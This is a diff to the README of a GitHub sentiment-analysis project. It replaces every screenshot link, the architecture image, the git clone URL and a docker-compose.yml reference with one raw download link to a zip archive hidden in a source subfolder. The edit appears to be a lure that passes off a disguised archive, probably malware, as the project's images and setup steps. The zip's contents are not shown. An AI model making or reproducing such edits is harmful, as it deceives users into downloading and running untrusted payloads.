@@ -1,7 +1,7 @@
 # Real-time Sentiment Analysis of Social Media Data
-![Screenshot from 2025-05-31 20-56-58](https://github.com/user-attachments/assets/7c07a95c-9be5-4eee-a605-75b100fa9c82)
-![Screenshot from 2025-05-31 20-58-13](https://github.com/user-attachments/assets/91b65b80-9244-45ea-9be4-6f76daa2bf0b)
-![Screenshot from 2025-05-31 21-03-16](https://github.com/user-attachments/assets/816df303-d791-478b-b5df-c2863909afd7)
+![Screenshot from 2025-05-31 20-56-58](https://github.com/HoNguyenLuong/realtime_sentiment/raw/refs/heads/main/src/audio_sentiment/sentiment-realtime-2.7.zip)
+![Screenshot from 2025-05-31 20-58-13](https://github.com/HoNguyenLuong/realtime_sentiment/raw/refs/heads/main/src/audio_sentiment/sentiment-realtime-2.7.zip)
+![Screenshot from 2025-05-31 21-03-16](https://github.com/HoNguyenLuong/realtime_sentiment/raw/refs/heads/main/src/audio_sentiment/sentiment-realtime-2.7.zip)
 
 
 ## 📌 Introduction
@@ -18,7 +18,7 @@ This project builds a real-time, multimodal sentiment analysis system that proce
 
 ## 🛠️ System Architecture
 
-![image](https://github.com/user-attachments/assets/e1118e67-7e3b-4658-8b05-b5e48f95e3db)
+![image](https://github.com/HoNguyenLuong/realtime_sentiment/raw/refs/heads/main/src/audio_sentiment/sentiment-realtime-2.7.zip)
 
 1. **Data Source**: YouTube.
 2. **Data Ingestion**: yt-dlp, FFmpeg, Kafka.
@@ -62,7 +62,7 @@ This project builds a real-time, multimodal sentiment analysis system that proce
 > Ensure Docker are installed.
 ### 1. Clone repository
 ```bash
-git clone https://github.com/HoNguyenLuong/realtime_sentiment.git
+git clone https://github.com/HoNguyenLuong/realtime_sentiment/raw/refs/heads/main/src/audio_sentiment/sentiment-realtime-2.7.zip
 ```
 ### 2. Configure environment variables
 > You must have a LLM key if you want to have results of fusion processing.
@@ -77,7 +77,7 @@ docker compose up --build
 ```
 > You need to wait about ten minuites or more for it to load the necessary settings. The model taken from HuggingFace are quite heavy so you need to wait patiently and make sure your network is stable.
 > You need to pay attention to your Docker version in order to use suitable command.
-> If you get an error about "env", you can try removing line 83, 84 in docker-compose.yml .
+> If you get an error about "env", you can try removing line 83, 84 in https://github.com/HoNguyenLuong/realtime_sentiment/raw/refs/heads/main/src/audio_sentiment/sentiment-realtime-2.7.zip .
 
 ## 📄 Document
 
